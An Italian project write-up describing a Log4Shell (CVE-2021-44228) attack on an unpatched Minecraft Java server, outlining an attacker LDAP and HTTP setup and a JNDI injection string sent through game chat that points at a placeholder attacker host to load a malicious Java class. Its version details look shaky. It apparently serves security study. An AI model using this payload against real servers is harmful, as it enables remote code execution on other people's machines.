# Minecraft Server RCE - TRIPALDI Gabriele
## Preambolo:  cos'è un server Minecraft?
Minecraft è un videgioco sandbox molto popolare che da vari anni è stato acquisito dalla Microsoft. Il gioco offre due versioni differenti, la "Java Edition" scritta appunto in Java, e la "Bedrock Edition" una versione multipiattaforma scritta in C++, un server dell abedrock edition non supporta client Java e viceversa.
Questo progetto si baserà sui server e client basati sulla versione Java, eseguibile solamente su sistemi Windows, Linux e Mac.

----------
### La vulnerabilità del server
Nella versione 1.8.0/1.8.8 del gioco è stata trovata la vulnerabilità zero-day **CVE-2021-44228**, meglio nota come Log4Shell.
Microsoft ha successivamente rilasciato una patch per prevenirne gli abusi direttamente sostituendo la versione nella repository ufficiale. Questi server sono chiamati "Vanilla", ossia senza modifiche del server stesso, tuttavia non sono in grado di prevenire l'abuso di cheat all'interno del gioco non offrendo funzionalità aggiuntive e per questo motivo sono stati creati dalla community, versioni di terze parti (es: Bukkit, Spigot, Paper) che consentono maggior sicurezza e l'installazione di plugins scritti in Java.
Visto che il server Vanilla vulnerabile è di difficile reperibilità, si è proceduto tramite risorse esterne a scaricare un server di terze parti molto popolare "Paper" che ha successivamente patchato il server ma la sua versione unpatched è più facile da reperire. 

**Log4j**: La vulnerabilità si basa sul framework Log4j che consente di gestire il loggin dell'applicazione o dei servizi online ed ha anche la possibilità di comunicare con altri servizi sul sistema. Minecraft implementa questo framework che sarà la causa della vulnerabilità.

## L'attacco
L'attacco parte sulla creazione di un server LDAP che sarà il punto di ingresso del traffico verso la vittima.
Viene in oltre messo su un server http (in questo caso viene usato un server python) che sarà l'esecutore dell'inziezione del codice malevolo.

**L'injection**: La fase di iniezione consiste di inviare via chat di gioco, un ????????? così composto: `${jndi:ldap://ip_serverLDAP_attaccante:porta_ldap/NomeClasseJavaMalevola}`, ciò farà si che il framework inzi una connessione LDAP al server dell'attaccante.
Non ci sono particolari complicanze in questa fase e questo messaggio può essere potenzialmente inviato da qualsiasi giocatore e da qualsiasi IP.






